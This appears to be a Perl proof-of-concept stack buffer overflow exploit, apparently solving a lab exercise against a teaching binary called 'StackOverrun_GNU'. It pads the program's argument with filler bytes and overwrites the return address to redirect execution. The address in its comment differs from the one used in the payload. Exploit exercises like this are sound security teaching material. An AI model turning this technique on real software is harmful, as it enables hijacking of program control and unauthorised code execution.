use warnings FATAL => 'all';
use strict;
#0x0804854e
my $spacer = "\x78\x56\x34\x12";
my $arg =  $spacer.$spacer.$spacer.$spacer.$spacer.$spacer.$spacer.$spacer.$spacer.$spacer.$spacer.$spacer.$spacer.$spacer.$spacer.$spacer.$spacer.$spacer.$spacer.$spacer.$spacer.$spacer.$spacer.$spacer.$spacer.$spacer.$spacer.$spacer.$spacer."\x66\x85\x04\x08"; 
my $cmd = "./StackOverrun_GNU ".$arg;
system($cmd);
